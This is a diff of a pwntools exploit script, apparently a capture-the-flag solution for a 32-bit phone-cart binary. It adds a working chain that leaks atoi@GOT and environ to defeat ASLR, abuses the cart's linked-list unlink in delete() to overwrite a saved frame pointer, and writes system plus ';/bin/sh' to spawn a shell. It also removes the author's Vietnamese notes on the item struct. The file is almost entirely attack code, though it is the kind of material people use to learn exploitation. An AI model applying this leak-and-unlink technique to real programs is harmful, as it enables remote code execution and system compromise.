@@ -22,14 +22,17 @@ def connect():
 def GDB(p):
     script = '''
     '''
+    
     gdb.attach(p, gdbscript=script)
-
-# OFFSET & VARIABLES
 
 # FUNCTIONS
 def add(p, phone):
     p.sendlineafter(b"> ", B(2))
     p.sendlineafter(b"Device Number> ", B(phone))
+
+def delete(p, phone):
+    p.sendlineafter(b"> ", B(3))
+    p.sendlineafter(b"Item Number> ", B(phone))    
 
 def checkout(p):
     p.sendlineafter(b"> ", B(5))
@@ -43,54 +46,58 @@ def listing_phones(p):
 def main():
     p = connect()
 
-    for i in range(0, 16):
+    log.info("Adding items to reach checkout threshold")
+    for _ in range(16):
         add(p, 1)
 
-    for j in range(0, 10):
+    for _ in range(10):
         add(p, 4)
 
+
+    log.info("Performing checkout")
     checkout(p)
-    listing_phones(p)
-
-    add(p, 1)
 
 
-    # GDB(p)
-    
-    
+    log.info("Leaking atoi@GOT to compute libc base address")
+    leak_payload = (
+        b"27"
+        + p32(e.got.atoi)
+        + p32(0) * 3
+    )
+    delete(p, leak_payload)
+
+    p.recvuntil(b"27:")
+    atoi_leak = u32(p.recv(4))
+    libc.address = atoi_leak - libc.symbols["atoi"]
+
+    log.success(f"atoi leak: {hex(atoi_leak)}")
+    log.success(f"libc base: {hex(libc.address)}")
+
+
+    leak_payload = (
+        b"27"
+        + p32(libc.symbols["environ"])
+        + p32(0) * 3
+    )
+    delete(p, leak_payload)
+
+    p.recvuntil(b"27:")
+    environ_leak = u32(p.recv(4))
+
+    log.success(f"environ_leak: {hex(environ_leak)}")
+
+    overwrite_ebp = (
+        b"27"
+        + p32(0) * 2
+        + p32(e.got.atoi + 0x22)
+        + p32(environ_leak - 0x8 - 0x104)
+    )
+    delete(p, overwrite_ebp)
+
+    system = libc.symbols["system"]
+    p.sendlineafter(b"> ", p32(system) + b";/bin/sh")
+
     p.interactive()
     
 if __name__ == '__main__':
     main()
-
-    
-'''
-
-Note:
-- create()
-    + Là một con trỏ cấp 2
-    + Tạo ra một con trỏ cấp 2 16 bytes
-        . ptr[0] = Tên của Phone
-        . ptr[1] = Giá tiền
-        . ptr[2] = ptr[3] = 0
-
-    ->
-        struct Item {
-            void *name;
-            int price;
-            struct Item *next;
-            struct Item *prev;  
-        }; 
-
-- insert()
-    + myCart là một danh sách liên kết trong đó các Node là các Items
-        -> head của myCart trỏ vào Item đầu tiên được tạo
-
-
-7174 = 16 * 199 + 10 * 399
-    
-
-
-Mục tiêu: Làm cách nào để có thể LEAK được libc base
-
-'''
